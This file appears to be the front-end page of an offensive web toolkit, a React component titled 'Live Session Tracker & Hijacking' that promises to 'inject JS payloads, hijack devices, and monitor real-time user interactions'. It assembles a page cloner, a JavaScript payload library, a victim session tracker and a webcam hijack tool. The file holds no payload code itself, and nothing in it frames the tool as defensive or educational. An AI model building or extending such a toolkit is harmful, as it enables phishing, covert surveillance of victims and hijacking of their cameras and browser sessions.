
'use client';

import { useState } from 'react';
import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
import { Separator } from '@/components/ui/separator';
import { WebcamHijackTool } from '@/components/webcam-hijack-tool';

export default function LiveTrackerPage() {
  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
  const [sessions, setSessions] = useState<Map<string, TrackedEvent[]>>(new Map());
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  const handleSelectPayload = (payload: JsPayload) => {
    setSelectedPayload(payload);
  }

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
        <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
      </div>

      <AdvancedPageCloner selectedPayload={selectedPayload}/>
      <Separator className="my-4" />
      <LiveTracker 
        sessions={sessions}
        setSessions={setSessions}
        selectedSessionId={selectedSessionId}
        setSelectedSessionId={setSelectedSessionId}
      />
      <Separator className="my-4" />
      <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
      <Separator className="my-4" />
      <WebcamHijackTool 
        sessions={sessions} 
        selectedSessionId={selectedSessionId}
        setSelectedSessionId={setSelectedSessionId}
      />

    </div>
  );
}
